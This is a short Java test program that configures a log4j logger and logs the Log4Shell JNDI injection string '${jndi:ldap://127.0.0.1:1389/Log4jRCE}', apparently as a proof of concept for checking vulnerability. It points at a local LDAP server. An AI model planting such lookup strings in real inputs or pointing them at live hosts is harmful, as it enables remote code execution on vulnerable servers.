import org.apache.log4j.BasicConfigurator;
import org.apache.log4j.Logger;
//import org.apache.logging.log4j.LogManager;
//import org.apache.logging.log4j.Logger;


public class log4j {
    private final static Logger logger = Logger.getLogger(log4j.class);

    // private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        BasicConfigurator.configure();
        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
    }
}